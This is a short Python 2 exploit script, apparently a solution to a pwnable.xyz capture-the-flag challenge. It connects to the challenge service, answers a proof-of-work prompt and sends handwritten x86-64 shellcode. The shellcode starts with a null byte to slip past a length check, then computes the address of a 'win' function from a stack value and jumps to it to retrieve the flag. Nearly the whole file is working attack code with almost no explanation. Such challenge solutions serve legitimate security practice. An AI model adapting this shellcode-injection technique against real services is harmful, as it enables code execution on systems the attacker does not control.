
import struct
import sys
import socket


host = "svc.pwnable.xyz"
port = 30025

try:

	print('[*] Creating socket')
	try:
	    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	except socket.error:
	    print('[+] Failed to create socket')
	    sys.exit()
	
	print('[*] Getting remote IP address') 
	try:
	    remote_ip = socket.gethostbyname( host )
	except socket.gaierror:
	    print('[+] Hostname could not be resolved. Exiting')
	    sys.exit()
	
	# Connect to remote server
	print("[*] Connecting to server, {} ( {} )".format(host, remote_ip))
	s.connect((remote_ip , port))

	#POW = "POW: x + y == 0x19426ac"
	POW = s.recv(1024)

	#>
	s.recv(1024)
	s.send("{} {}\n".format( 0, int(POW.strip('\n')[14:], 16) ))

	#loading challenge
	s.recv(1024)

	#Shellcode executioner/ Input
	s.recv(1024).strip('\n')


	stack_offset = 0x48 #+
	win_offset = 0x14f #-
	
	#define PROT_READ	0x1		/* page can be read */
	#define PROT_WRITE	0x2		/* page can be written */
	#define PROT_EXEC	0x4		/* page can be executed */
	#full access        0x7

	#mmap(0LL, 4096uLL, 7, 34, 0, 0LL);


	shellcode = ''
	shellcode += '\x00\xc0' 					#add al, al, we need a byte to avoid strlen check and encryption
	shellcode += '\x54'							#push rsp
	shellcode += '\x58'							#pop rax
	shellcode += '\x48\x83\xc0\x48'				#add rax, 0x48
	shellcode += '\x48\x8b\x00'					#mov rax, [rax]
	shellcode += '\x48\x2d\x4f\x01\x00\x00'		#sub rax, 0x14f
	shellcode += '\xff\xe0'						#jmp rax


	s.send(shellcode + '\n')
	flag = s.recv(1024)
	print flag	

	s.close()


except KeyboardInterrupt:	
	print "Ctrl-C detected"





